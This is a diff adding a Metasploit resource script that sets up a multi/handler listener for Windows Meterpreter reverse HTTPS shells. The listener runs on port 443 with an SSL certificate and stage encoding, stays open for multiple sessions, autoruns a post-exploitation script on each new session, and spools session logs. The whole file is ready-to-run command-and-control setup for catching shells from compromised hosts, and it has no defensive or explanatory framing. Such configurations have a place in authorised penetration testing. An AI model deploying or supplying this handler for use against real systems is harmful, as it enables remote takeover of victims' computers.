@@ -1,0 +1,33 @@
+
+#load auto_add_route
+#load alias
+#alias del rm
+#alias handler use exploit/multi/handler
+#load sounds
+setg TimestampOutput true
+setg VERBOSE true
+setg ExitOnSession false
+setg EnableStageEncoding true
+
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_https
+
+setg LHOST 0.0.0.0
+setg LPORT 443
+
+set handlersslcert /root/SSL-certs/unified.pem
+#set ignoreunknownpayloads true
+#set stagerverifysslcert true
+
+set AutoRunScript 'multi_console_command -rc "/root/.msf4/msf_autorunscript.rc"'
+#spool /root/msf_console.05-19-2017_17-41-53.log
+<ruby>
+#parse out the last octed of our IP address from eth0 and assign it as LHOST
+#myip = `ifconfig eth0 | sed -n 2p | cut -d " " -f 10 | cut -d " " -f1 | cut -d "." -f4`.chomp!
+#run_single("set LHOST host-#{myip}.ipsec.io")
+
+#create log file name and set to spool
+logfile = `date +%Y-%m-%d-_%H-%M-%S`.chomp!
+run_single("spool /root/logs/msf_sessions.#{logfile}.log")
+</ruby>
+
